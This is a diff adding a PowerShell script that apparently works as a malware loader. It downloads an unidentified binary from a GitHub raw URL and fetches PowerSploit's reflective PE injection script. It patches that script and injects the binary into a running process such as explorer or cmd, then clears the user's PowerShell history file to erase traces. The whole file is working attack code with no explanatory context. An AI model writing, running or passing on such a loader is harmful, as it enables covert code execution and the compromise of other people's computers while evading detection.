@@ -1,0 +1,55 @@
+$ErrorActionPreference = "Stop"
+
+$dllUrl = "https://raw.githubusercontent.com/warushop019-ship-it/w/refs/heads/main/xWrite"
+$webClient = New-Object System.Net.WebClient
+$webClient.Headers.Add("User-Agent", "Mozilla/5.0")
+
+try {
+    $peBytes = $webClient.DownloadData($dllUrl)
+} catch {
+    exit
+}
+
+$scriptUrl = "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-ReflectivePEInjection.ps1"
+try {
+    $scriptContent = $webClient.DownloadString($scriptUrl)
+} catch {
+    exit
+}
+
+$oldAddr = '$GetProcAddress = $UnsafeNativeMethods.GetMethod(''GetProcAddress'')'
+$newAddr = '$GetProcAddress = $UnsafeNativeMethods.GetMethod(''GetProcAddress'', [Type[]] @([System.Runtime.InteropServices.HandleRef], [String]))'
+
+$oldHandle = '$GetModuleHandle = $UnsafeNativeMethods.GetMethod(''GetModuleHandle'')'
+$newHandle = '$GetModuleHandle = $UnsafeNativeMethods.GetMethod(''GetModuleHandle'', [Type[]] @([String]))'
+
+$scriptContent = $scriptContent.Replace($oldAddr, $newAddr)
+$scriptContent = $scriptContent.Replace($oldHandle, $newHandle)
+
+$scriptBlock = [scriptblock]::Create($scriptContent)
+. $scriptBlock 
+
+
+$safeHosts = @("explorer", "cmd", "conhost", "Taskmgr")
+$targetProcess = $null
+$processName = ""
+
+foreach ($hostName in $safeHosts) {
+    $proc = Get-Process -Name $hostName -ErrorAction SilentlyContinue
+    if ($proc) {
+        $targetProcess = $proc
+        $processName = $hostName
+        break
+    }
+}
+
+if ($targetProcess) {
+    # If multiple processes with the same name exist, pick the first one
+    $targetPid = $targetProcess[0].Id
+    Invoke-ReflectivePEInjection -peBytes $peBytes -ProcId $targetPid
+}
+
+$historyPath = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
+if (Test-Path $historyPath) {
+    Clear-Content -Path $historyPath -ErrorAction SilentlyContinue
+}
